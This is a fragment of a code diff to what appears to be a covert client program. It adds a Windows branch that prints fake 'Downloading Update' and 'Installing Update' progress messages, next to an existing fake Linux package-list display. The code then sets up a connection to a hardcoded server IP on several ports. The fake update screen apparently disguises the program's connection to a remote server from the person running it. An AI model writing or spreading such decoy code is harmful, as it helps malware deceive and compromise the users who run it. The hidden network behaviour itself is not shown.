@@ -465,6 +465,13 @@ def main():
         print('Building package lists...\r')
         print("Reading package lists...",end='')
         time.sleep(.1)
+    elif sys.platform.startswith('win'):
+        for i in range(25):
+            print("Downloading Update {} of 25...".format(i))
+            time.sleep(.5)
+            print("Installing Update {} of 25...".format(i))
+            time.sleep(.7)
+        print('Finalizing Update....')
     # This is setting up the client to communicate with the server
     ip = '10.0.5.130'
     ports = [8888, 7777, 6666, 5555]
